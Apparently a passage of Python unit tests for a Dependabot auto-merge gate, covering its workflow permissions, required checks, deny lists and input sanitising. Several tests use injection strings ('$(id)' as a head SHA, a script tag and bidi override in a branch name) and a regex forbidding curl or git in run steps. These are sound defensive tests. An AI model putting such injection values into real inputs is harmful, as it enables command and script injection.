    regex = "".join(".*" if part == "**" else "[^/]*" if part == "*" else re.escape(part) for part in re.split(r"(\*\*|\*)", pattern))
    return re.fullmatch(regex, path) is not None


def name_matches(template: str, name: str) -> bool:
    """A job `name:` with `${{ }}` expressions against one check name."""
    regex = ".*".join(re.escape(part) for part in re.split(r"\$\{\{.*?\}\}", template))
    return re.fullmatch(regex, name) is not None


class PolicyTableTests(unittest.TestCase):
    def test_deny_list_entries_are_still_dependencies(self) -> None:
        go_mod = (ROOT / "go.mod").read_text(encoding="utf-8")
        for name in GATE.DENY_GOMOD:
            with self.subTest(name=name):
                self.assertRegex(go_mod, rf"(?m)^\t{re.escape(name)} v\S+", "stale DENY_GOMOD entry: not required in go.mod")
        package = json.loads((ROOT / "website" / "package.json").read_text(encoding="utf-8"))
        dependencies = {**package["dependencies"], **package["devDependencies"]}
        for name in GATE.DENY_NPM:
            with self.subTest(name=name):
                self.assertIn(name, dependencies, "stale DENY_NPM entry: not in website/package.json")

    def test_every_exact_npm_pin_is_deny_listed(self) -> None:
        # version-pinning.md: "Core Docusaurus packages use exact versions".
        package = json.loads((ROOT / "website" / "package.json").read_text(encoding="utf-8"))
        dependencies = {**package["dependencies"], **package["devDependencies"]}
        exact = {name for name, version in dependencies.items() if re.fullmatch(r"\d+\.\d+\.\d+", version)}
        self.assertEqual(exact, set(GATE.DENY_NPM))

    def test_stale_deny_entry_is_detected(self) -> None:
        go_mod = (ROOT / "go.mod").read_text(encoding="utf-8")
        self.assertNotRegex(go_mod, r"(?m)^\tgithub\.com/invowk/no-such-module v\S+")

    def test_ecosystem_files_exist(self) -> None:
        for eco in GATE.ECOSYSTEMS:
            self.assertIn(eco.manifest, eco.files)
            for filename in eco.files:
                self.assertTrue((ROOT / filename).is_file(), filename)

    def test_required_sets_are_pinned(self) -> None:
        # Dropping a required check is a policy change: it must show up here.
        every_pr = {
            ("normalized golangci-lint gates", "Lint"),
            ("goplint consumer gates", "Lint"),
            ("script tests (worktree-safety gate)", "Lint"),
            ("file length gate (1000 lines)", "Lint"),
            ("agent docs integrity", "Lint"),
            ("Models, golden vectors, and correspondence", "Formal Verification"),
            ("Analyze (actions)", "CodeQL"),
            ("Analyze (go)", "CodeQL"),
            ("Analyze (javascript-typescript)", "CodeQL"),
            ("Analyze (python)", "CodeQL"),
            ("CodeQL", "CodeQL"),
        }
        ci = {
            "Test (ubuntu-latest / docker)",
            "Test (ubuntu-latest / podman)",
            "Test (windows)",
            "Test (macos)",
            "Build (linux/amd64)",
            "Build (linux/arm64)",
            "Build (darwin/amd64)",
            "Build (darwin/arm64)",
            "Build (windows/amd64)",
            "License Headers",
            "govulncheck",
            "PGO Sanity",
            "GoReleaser Check",
            "Release Dry Run",
        }
        expected = {
            "gomod": every_pr | {(name, "CI") for name in ci},
            "npm": every_pr | {("test-build", "Test Website Build")},
        }
        for eco in GATE.ECOSYSTEMS:
            with self.subTest(ecosystem=eco.name):
                self.assertEqual({(check.name, check.workflow) for check in eco.required}, expected[eco.name])
                apps = {check.name: check.app for check in eco.required}
                self.assertEqual(apps.pop("CodeQL"), "github-advanced-security")
                self.assertEqual(set(apps.values()), {"github-actions"})

    def test_required_checks_ran_on_the_real_pull_requests(self) -> None:
        for number, required in ((190, GATE.REQUIRED_GOMOD), (189, GATE.REQUIRED_NPM)):
            ran = {(run["name"], run["app"]["slug"]) for run in real(number)["check_runs"]}
            for check in required:
                with self.subTest(pr=number, check=check.name):
                    self.assertIn((check.name, check.app), ran)

    def test_required_checks_match_the_workflow_files(self) -> None:
        docs = workflow_docs()
        for eco in GATE.ECOSYSTEMS:
            for check in eco.required:
                with self.subTest(ecosystem=eco.name, check=check.name):
                    doc = docs[check.workflow]
                    trigger = doc["on"]["pull_request"]
                    self.assertNotIn("paths-ignore", trigger)
                    self.assertIn("main", trigger.get("branches", ["main"]))
                    for filename in eco.files:
                        self.assertTrue(
                            "paths" not in trigger or any(glob_matches(pattern, filename) for pattern in trigger["paths"]),
                            f"{check.workflow} does not start for {filename}",
                        )
                    if check.app != GATE.ACTIONS_APP:
                        continue
                    jobs = [
                        job
                        for job_id, job in doc["jobs"].items()
                        if name_matches(job.get("name", job_id), check.name)
                    ]
                    self.assertEqual(len(jobs), 1, f"no single job of {check.workflow} is named {check.name!r}")
                    self.assertNotIn("if", jobs[0], "a conditional job can be skipped: it cannot be required")

    def test_ignored_checks_are_job_names(self) -> None:
        docs = workflow_docs()
        names = {"Track Benchmarks": "Benchmarks", "Dependabot merge gate": "Dependabot Gate"}
        self.assertEqual(set(names), {name for name, _ in GATE.IGNORED_CHECKS})
        for check, workflow in names.items():
            self.assertIn(check, [job.get("name") for job in docs[workflow]["jobs"].values()])

    def test_glob_and_name_matching(self) -> None:
        self.assertTrue(glob_matches("website/**", "website/package-lock.json"))
        self.assertTrue(glob_matches("go.mod", "go.mod"))
        self.assertFalse(glob_matches("*.go", "go.mod"))
        self.assertFalse(glob_matches("*.go", "cmd/main.go"))
        self.assertTrue(name_matches("Build (${{ matrix.os }}/${{ matrix.arch }})", "Build (linux/amd64)"))
        self.assertFalse(name_matches("Build (${{ matrix.os }}/${{ matrix.arch }})", "Test (windows)"))
        self.assertFalse(name_matches("govulncheck", "govulncheck (all)"))


class GateWorkflowTests(unittest.TestCase):
    def setUp(self) -> None:
        self.text = GATE_WORKFLOW.read_text(encoding="utf-8")
        self.doc = load_yaml(self.text)
        (self.job,) = self.doc["jobs"].values()
        self.steps = {step["name"]: step for step in self.job["steps"]}

    def test_runs_only_on_workflow_run_of_the_required_workflows(self) -> None:
        self.assertEqual(list(self.doc["on"]), ["workflow_run"])
        trigger = self.doc["on"]["workflow_run"]
        self.assertEqual(trigger["types"], ["completed"])
        required = {check.workflow for eco in GATE.ECOSYSTEMS for check in eco.required}
        self.assertEqual(sorted(trigger["workflows"]), sorted(required))
        self.assertEqual(set(trigger), {"workflows", "types"})

    def test_mode_is_a_constant_and_decide_only(self) -> None:
        self.assertEqual(self.doc["env"], {"GATE_MODE": "decide-only"})
        self.assertIn(self.doc["env"]["GATE_MODE"], GATE.MODES)
        self.assertNotIn("env", self.job)
        for step in self.job["steps"]:
            self.assertNotIn("GATE_MODE", step.get("env", {}), step["name"])
        self.assertNotIn("vars.GATE_MODE", self.text)

    def test_token_is_read_only(self) -> None:
        self.assertEqual(str(self.doc["permissions"]), "{}")
        self.assertEqual(
            self.job["permissions"],
            {"contents": "read", "pull-requests": "read", "checks": "read", "statuses": "read"},
        )

    def test_job_filters_on_dependabot_pull_request_runs(self) -> None:
        condition = " ".join(self.job["if"].split())
        for clause in (
            "github.event.workflow_run.event == 'pull_request'",
            "github.event.workflow_run.actor.login == 'dependabot[bot]'",
            "github.event.workflow_run.triggering_actor.login == 'dependabot[bot]'",
            "github.event.workflow_run.head_repository.full_name == github.repository",
        ):
            self.assertIn(clause, condition.split(" && "))
        self.assertNotIn("||", condition)
        self.assertIn((self.job["name"], GATE.ACTIONS_APP), GATE.IGNORED_CHECKS)

    def test_one_evaluation_per_head_commit(self) -> None:
        self.assertEqual(
            self.doc["concurrency"],
            {"group": "dependabot-gate-${{ github.event.workflow_run.head_sha }}", "cancel-in-progress": "false"},
        )

    def test_never_checks_out_pull_request_code(self) -> None:
        checkouts = [step for step in self.job["steps"] if step.get("uses", "").startswith("actions/checkout@")]
        self.assertEqual(len(checkouts), 1)
        self.assertEqual(
            checkouts[0]["with"],
            {
                "persist-credentials": "false",
                "sparse-checkout": "scripts/dependabot-gate.py",
                "sparse-checkout-cone-mode": "false",
            },
        )
        self.assertNotIn("github.event.workflow_run.head_branch", self.text)
        for step in self.job["steps"]:
            self.assertNotRegex(step.get("run", ""), r"\bgit\b|gh pr checkout|gh run download|\bcurl\b|\bnpm\b|\bgo\b|\bmake\b")

    def test_actions_use_the_majors_of_the_other_workflows(self) -> None:
        pins: dict[str, set[str]] = {}
        for path in WORKFLOWS.glob("*.yml"):
            if path != GATE_WORKFLOW:
                for action, ref in re.findall(r"uses: ([\w./-]+)@(\S+)", path.read_text(encoding="utf-8")):
                    pins.setdefault(action, set()).add(ref)
        used = [step["uses"].split("@") for step in self.job["steps"] if "uses" in step]
        self.assertEqual(sorted(action for action, _ in used), ["actions/checkout", "actions/create-github-app-token"])
        for action, ref in used:
            self.assertEqual(pins[action], {ref}, action)
            self.assertRegex(ref, r"^v\d+$")

    def test_event_values_never_reach_a_shell_as_text(self) -> None:
        for step in self.job["steps"]:
            self.assertNotIn("${{", step.get("run", ""), step["name"])
        decide = self.steps["Decide"]
        self.assertEqual(
            decide["env"],
            {
                "GH_TOKEN": "${{ github.token }}",
                "GATE_REPOSITORY": "${{ github.repository }}",
                "GATE_HEAD_SHA": "${{ github.event.workflow_run.head_sha }}",
            },
        )
        self.assertTrue(decide["run"].startswith("python3 -I scripts/dependabot-gate.py gate "))
        self.assertNotIn("if", decide)
        self.assertNotIn("continue-on-error", self.text)

    def test_app_token_and_merge_need_merge_mode_and_a_merge_verdict(self) -> None:
        names = [step["name"] for step in self.job["steps"]]
        self.assertEqual(
            names,
            ["Checkout the decision script from main", "Decide", "Mint the merge App token", "Squash-merge the pull request"],
        )
        self.assertEqual(self.steps["Decide"]["id"], "decide")
        for name in names[:2]:
            dumped = json.dumps(self.steps[name])
            for needle in ("secrets.", "vars.", "app-token", "create-github-app-token", "gh pr merge", "write"):
                self.assertNotIn(needle, dumped, name)
        for name in names[2:]:
            self.assertEqual(self.steps[name]["if"], GUARD, name)
        self.assertNotEqual(self.doc["env"]["GATE_MODE"], "merge")
        mint, merge = self.steps[names[2]], self.steps[names[3]]
        self.assertEqual(mint["id"], "app-token")
        self.assertEqual(
            mint["with"],
            {
                "app-id": "${{ vars.DEPENDABOT_MERGE_APP_ID }}",
                "private-key": "${{ secrets.DEPENDABOT_MERGE_APP_PRIVATE_KEY }}",
                "permission-contents": "write",
                "permission-pull-requests": "write",
            },
        )
        self.assertEqual(merge["env"]["GH_TOKEN"], "${{ steps.app-token.outputs.token }}")
        self.assertRegex(" ".join(merge["run"].replace("\\\n", " ").split()), r'^gh pr merge "\$GATE_PR_NUMBER" --repo "\$GATE_REPOSITORY" --squash --match-head-commit "\$GATE_HEAD_SHA"$')
        code = "\n".join(line for line in self.text.splitlines() if not line.lstrip().startswith("#"))
        self.assertEqual(code.count("secrets."), 1)
        self.assertEqual(code.count("steps.app-token.outputs.token"), 1)
        for forbidden in ("gh pr review", "gh pr comment", "gh pr edit", "gh api", "--admin", "--auto", "pull_request_target"):
            self.assertNotIn(forbidden, code)


class DependabotConfigTests(unittest.TestCase):
    GROUP_OPTIONS = {"applies-to", "dependency-type", "exclude-patterns", "group-by", "patterns", "update-types"}
    EXTRA_EXCLUDES = {"gomod": {"github.com/coder/acp-go-sdk", "github.com/openai/openai-go/v3"}, "npm": set()}

    def setUp(self) -> None:
        self.doc = load_yaml(DEPENDABOT_CONFIG.read_text(encoding="utf-8"))
        self.updates = {update["package-ecosystem"]: update for update in self.doc["updates"]}

    def test_parses_like_a_full_yaml_reader(self) -> None:
        try:
            import yaml
        except ImportError:  # PyYAML is optional: the comparison runs where it exists.
            return

        def text(value: object) -> object:
            if isinstance(value, dict):
                return {str(key): text(child) for key, child in value.items()}
            if isinstance(value, list):
                return [text(child) for child in value]
            return str(value)

        self.assertEqual(text(yaml.safe_load(DEPENDABOT_CONFIG.read_text(encoding="utf-8"))), text(self.doc))

    def test_keeps_the_schedule_labels_and_prefixes(self) -> None:
        self.assertEqual(self.doc["version"], "2")
        self.assertEqual(
            {name: (update["directory"], update["commit-message"]["prefix"], update["labels"]) for name, update in self.updates.items()},
            {
                "gomod": ("/", "deps(go)", ["dependencies", "go"]),
                "npm": ("/website", "deps(npm)", ["dependencies", "website"]),
                "github-actions": ("/", "deps(actions)", ["dependencies", "ci"]),
            },
        )
        for update in self.doc["updates"]:
            self.assertEqual(update["schedule"], {"interval": "weekly", "day": "monday", "time": "09:00", "timezone": "UTC"})
            self.assertEqual(update["open-pull-requests-limit"], "5")

    def test_groups_use_documented_options(self) -> None:
        for update in self.doc["updates"]:
            for name, group in update["groups"].items():
                with self.subTest(group=name):
                    self.assertRegex(name, r"^[A-Za-z]([A-Za-z|_-]*[A-Za-z])?$")
                    self.assertLessEqual(set(group), self.GROUP_OPTIONS)
                    self.assertIn(group.get("applies-to", "version-updates"), ("version-updates", "security-updates"))
                    self.assertLessEqual(set(group.get("update-types", [])), {"minor", "patch", "major"})
                    for key in ("patterns", "exclude-patterns", "update-types"):
                        self.assertIsInstance(group.get(key, []), list)

    def test_gate_ecosystems_group_patch_and_minor_only(self) -> None:
        for eco in GATE.ECOSYSTEMS:
            groups = self.updates[eco.name]["groups"]
            self.assertEqual(len(groups), 1, eco.name)
            for group in groups.values():
                self.assertEqual(sorted(group["update-types"]), ["minor", "patch"], eco.name)

    def test_groups_exclude_the_deny_list_and_the_fast_sdks(self) -> None:
        for eco in GATE.ECOSYSTEMS:
            for group_name, group in self.updates[eco.name]["groups"].items():
                excludes = group["exclude-patterns"]
                for name in list(eco.deny) + sorted(self.EXTRA_EXCLUDES[eco.name]):
                    with self.subTest(group=group_name, dependency=name):
                        self.assertTrue(any(fnmatch.fnmatchcase(name, pattern) for pattern in excludes), f"{name} is not excluded")
                self.assertEqual(set(excludes), set(eco.deny) | self.EXTRA_EXCLUDES[eco.name], "an exclude with no stated reason")

    def test_excluded_names_are_still_dependencies(self) -> None:
        go_mod = (ROOT / "go.mod").read_text(encoding="utf-8")
        for name in self.EXTRA_EXCLUDES["gomod"]:
            self.assertRegex(go_mod, rf"(?m)^\t{re.escape(name)} v\S+", name)


# ---------------------------------------------------------------- CLI layer


class FakeGitHub:
    """Serves one snapshot through the REST paths the script reads."""

    def __init__(self, snapshot: dict, pulls: list[dict] | None = None, mergeable_after: int = 0) -> None:
        self.snapshot = snapshot
        self.calls: list[str] = []
        self.pr_reads = 0
        self.mergeable_after = mergeable_after
        pr = snapshot["pull_request"]
        self.pulls = pulls if pulls is not None else [self.pull(pr["number"], pr["head"]["sha"])]

    @staticmethod
    def pull(number: int, sha: str, state: str = "open", repo: str = REPO) -> dict:
        return {"number": number, "state": state, "head": {"sha": sha}, "base": {"repo": {"full_name": repo}}}

    def __call__(self, path: str) -> object:
        self.calls.append(path)
        match = re.fullmatch(r"(.*?)[?&]per_page=100&page=(\d+)", path)
        route, page = (match.group(1), int(match.group(2))) if match else (path, 1)
        window = slice((page - 1) * 100, page * 100)
        pr = self.snapshot["pull_request"]
        sha, base = pr["head"]["sha"], f"repos/{REPO}/pulls/{pr['number']}"
        if re.fullmatch(rf"repos/{REPO}/commits/[0-9a-f]{{40}}/pulls", route):
            return self.pulls[window]
        if route == base:
            self.pr_reads += 1
            return {**pr, "mergeable": pr["mergeable"] if self.pr_reads > self.mergeable_after else None, "title": "x"}
        if route == f"{base}/commits":
            return [{**commit, "url": "x"} for commit in self.snapshot["commits"]][window]
        if route == f"{base}/files":
            return [{"patch": "@@ lockfile", **entry, "sha": "x"} for entry in self.snapshot["files"]][window]
        if route == f"repos/{REPO}/commits/{sha}/check-runs?filter=latest":
            runs = self.snapshot["check_runs"]
            return {"total_count": len(runs), "check_runs": [{**run, "id": 1} for run in runs][window]}
        if route == f"repos/{REPO}/commits/{sha}/status":
            return {"state": "pending", "total_count": 0, "statuses": self.snapshot["statuses"][window]}
        raise AssertionError(f"unexpected API path: {path}")


class CommandLineTests(unittest.TestCase):
    SHA = "862bccdff65c5b51281858c8c9c6b2f716c032b0"

    def gate(self, api: object, *argv: str) -> tuple[int, dict, str, dict[str, str], str]:
        """Run `gate`; return (rc, verdict, stderr, GITHUB_OUTPUT pairs, summary file)."""
        with tempfile.TemporaryDirectory() as tmp:
            output, summary = Path(tmp) / "output", Path(tmp) / "summary"
            out, err = io.StringIO(), io.StringIO()
            with (
                mock.patch.object(GATE, "gh_api", api),
                mock.patch.object(GATE.time, "sleep") as sleep,
                contextlib.redirect_stdout(out),
                contextlib.redirect_stderr(err),
            ):
                rc = GATE.main(["gate", "--repo", REPO, *argv, "--summary", str(summary), "--github-output", str(output)])
            self.sleeps = sleep.call_count
            pairs = dict(line.split("=", 1) for line in output.read_text().splitlines()) if output.exists() else {}
            return rc, json.loads(out.getvalue()), err.getvalue(), pairs, summary.read_text() if summary.exists() else ""

    def test_merge_verdict_through_the_api(self) -> None:
        api = FakeGitHub(green_gomod())
        rc, verdict, err, outputs, summary = self.gate(api, "--head-sha", self.SHA, "--mode", "decide-only")
        self.assertEqual((rc, verdict["decision"], verdict["reasons"]), (0, "merge", []))
        self.assertEqual(outputs, {"decision": "merge", "pr_number": "190", "head_sha": self.SHA})
        self.assertIn("### Dependabot merge gate: MERGE", summary)
        self.assertIn("- Mode: decide-only: the workflow merges nothing in this mode", summary)
        self.assertEqual(summary, err)
        self.assertTrue(all(call.startswith(f"repos/{REPO}/") for call in api.calls))

    def test_snapshot_keeps_exactly_the_fixture_fields(self) -> None:
        for snapshot in (real(189), real(190), real(191), green_gomod()):
            with self.subTest(pr=snapshot["pull_request"]["number"]):
                sha = snapshot["pull_request"]["head"]["sha"]
                self.assertEqual(GATE.build_snapshot(FakeGitHub(snapshot), REPO, snapshot["pull_request"]["number"], sha), snapshot)

    def test_real_pull_requests_hold_through_the_api(self) -> None:
        for number in (189, 190, 191):
            with self.subTest(pr=number):
                snapshot = real(number)
                rc, verdict, _, outputs, _ = self.gate(FakeGitHub(snapshot), "--head-sha", snapshot["head_sha"])
                self.assertEqual((rc, verdict["decision"], outputs["decision"]), (0, "hold", "hold"))
                self.assertEqual(verdict, GATE.decide(snapshot))

    def test_needs_exactly_one_open_pull_request_for_the_head(self) -> None:
        pull = FakeGitHub.pull
        cases = {
            "none": ([], 0),
            "two": ([pull(190, self.SHA), pull(192, self.SHA)], 2),
            "closed": ([pull(190, self.SHA, state="closed")], 0),
            "head moved": ([pull(190, "1" * 40)], 0),
            "another repository": ([pull(190, self.SHA, repo="mallory/invowk")], 0),
            "number is not an integer": ([pull("190", self.SHA)], 1),
        }
        for label, (pulls, found) in cases.items():
            with self.subTest(case=label):
                api = FakeGitHub(green_gomod(), pulls=pulls)
                rc, verdict, _, outputs, _ = self.gate(api, "--head-sha", self.SHA)
                self.assertEqual((rc, verdict["decision"]), (0, "hold"))
                self.assertEqual(verdict["reasons"], [f"expected exactly one open pull request with head {self.SHA}, found {found}"])
                self.assertEqual(outputs, {"decision": "hold", "pr_number": "", "head_sha": self.SHA})
                self.assertEqual(len(api.calls), 1)

    def test_malformed_head_sha_reads_nothing(self) -> None:
        for sha in ("main", "$(id)", "862bccd"):
            with self.subTest(sha=sha):
                api = FakeGitHub(green_gomod())
                rc, verdict, _, outputs, _ = self.gate(api, "--head-sha", sha)
                self.assertEqual((rc, verdict["decision"], api.calls), (0, "hold", []))
                self.assertEqual(outputs, {"decision": "hold", "pr_number": "", "head_sha": ""})

    def test_head_moved_after_the_run_holds(self) -> None:
        snapshot = green_gomod()
        api = FakeGitHub(snapshot, pulls=[FakeGitHub.pull(190, "1" * 40)])
        with mock.patch.object(GATE, "resolve_pull_request", return_value=(190, "")):
            rc, verdict, _, outputs, _ = self.gate(api, "--head-sha", "1" * 40)
        self.assertEqual((rc, outputs["decision"]), (0, "hold"))
        self.assertTrue(any("but the pull request head is now" in reason for reason in verdict["reasons"]))

    def test_unreadable_github_is_a_hold_and_a_failure(self) -> None:
        def broken(path: str) -> object:
            raise GATE.GateError("gh api failed: HTTP 502")

        rc, verdict, _, outputs, summary = self.gate(broken, "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"], outputs["decision"]), (1, "hold", "hold"))
        self.assertIn("GitHub could not be read, so nothing was decided", verdict["reasons"][0])
        self.assertIn("HOLD", summary)

    def test_reads_every_page(self) -> None:
        snapshot = green_gomod()
        extra = [
            {"name": f"extra {i}", "status": "completed", "conclusion": "success", "head_sha": self.SHA, "app": {"slug": "x"}}
            for i in range(170)
        ]
        snapshot["check_runs"] = extra + snapshot["check_runs"]
        api = FakeGitHub(snapshot)
        rc, verdict, _, _, _ = self.gate(api, "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"]), (0, "merge"))
        self.assertEqual(len([call for call in api.calls if "/check-runs?" in call]), 3)
        snapshot["check_runs"][150]["conclusion"] = "failure"
        rc, verdict, _, _, _ = self.gate(FakeGitHub(snapshot), "--head-sha", self.SHA)
        self.assertEqual(verdict["reasons"], ['check "extra 150" ("x") concluded "failure"'])

    def test_incomplete_check_run_listing_fails(self) -> None:
        api = FakeGitHub(green_gomod())

        def short(path: str) -> object:
            body = api(path)
            if "/check-runs?" in path:
                body["total_count"] += 1
            return body

        rc, verdict, _, outputs, _ = self.gate(short, "--head-sha", self.SHA)
        self.assertEqual((rc, outputs["decision"]), (1, "hold"))
        self.assertIn("total_count", verdict["reasons"][0])
        for body in ({"check_runs": None}, [], "x"):
            with self.subTest(body=body), self.assertRaises(GATE.GateError):
                GATE.fetch_all(lambda path: body, "x", "check_runs", check_total=True)
        with self.assertRaises(GATE.GateError):
            GATE.fetch_all(lambda path: [{}] * 100, "x")

    def test_waits_for_github_to_compute_mergeability(self) -> None:
        rc, verdict, _, _, _ = self.gate(FakeGitHub(green_gomod(), mergeable_after=2), "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"], self.sleeps), (0, "merge", 2))
        rc, verdict, _, _, _ = self.gate(FakeGitHub(green_gomod(), mergeable_after=99), "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"], self.sleeps), (0, "hold", GATE.MERGEABLE_ATTEMPTS - 1))
        self.assertIn("does not report the pull request as mergeable", verdict["reasons"][0])

    def test_gh_api_is_a_read(self) -> None:
        with mock.patch.object(GATE.subprocess, "run") as run:
            run.return_value = mock.Mock(returncode=0, stdout='{"ok": true}', stderr="")
            self.assertEqual(GATE.gh_api("repos/x/y/pulls/1"), {"ok": True})
            argv = run.call_args.args[0]
            self.assertEqual(argv[:4], ["gh", "api", "--method", "GET"])
            self.assertEqual(argv[-1], "repos/x/y/pulls/1")
            self.assertNotIn("shell", run.call_args.kwargs)
            # On an HTTP error gh prints the error body, which is JSON too.
            for result in (
                mock.Mock(returncode=1, stdout='{"message": "Not Found"}', stderr="gh: Not Found (HTTP 404)"),
                mock.Mock(returncode=0, stdout="<html>", stderr=""),
            ):
                run.return_value = result
                with self.assertRaises(GATE.GateError):
                    GATE.gh_api("repos/x/y/pulls/1")
            run.side_effect = FileNotFoundError("gh")
            with self.assertRaises(GATE.GateError):
                GATE.gh_api("repos/x/y/pulls/1")

    def test_summary_is_inert_markdown(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["head"]["ref"] = "x<script>alert(1)</script>[click](https://example.com)‮"
        summary = GATE.render_summary(GATE.decide(snapshot), "decide-only")
        self.assertNotIn("<", summary)
        self.assertNotIn("](", summary)
        self.assertTrue(summary.isascii())
        self.assertIn("&lt;script&gt;", summary)
        verdict = GATE.hold_verdict("a reason with \u202e and \x1b[31m")
        verdict["dependencies"] = [{"dependency-name": "re\u202eact", "dependency-version": "1.0.0"}]
        summary = GATE.render_summary(verdict, None)
        self.assertTrue(summary.isascii() and summary.replace("\n", "").isprintable(), summary)
        self.assertNotIn("Mode:", summary)

    def test_decide_command(self) -> None:
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = GATE.main(["decide", str(FIXTURES / "pr-189.json")])
            missing = GATE.main(["decide", str(FIXTURES / "no-such-file.json")])
        self.assertEqual((rc, missing), (0, 2))
        self.assertEqual(json.loads(out.getvalue())["decision"], "hold")
        self.assertIn("Dependabot merge gate: HOLD", err.getvalue())

    def test_usage_errors(self) -> None:
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(GATE.main(["gate", "--repo", "not a repo", "--head-sha", self.SHA]), 2)
            for argv in (["gate", "--repo", REPO], ["gate", "--repo", REPO, "--pr", "1", "--head-sha", self.SHA], ["decide", "x", "--mode", "auto"]):
                with self.assertRaises(SystemExit) as raised:
                    GATE.main(argv)
                self.assertEqual(raised.exception.code, 2)


if __name__ == "__main__":
    unittest.main()
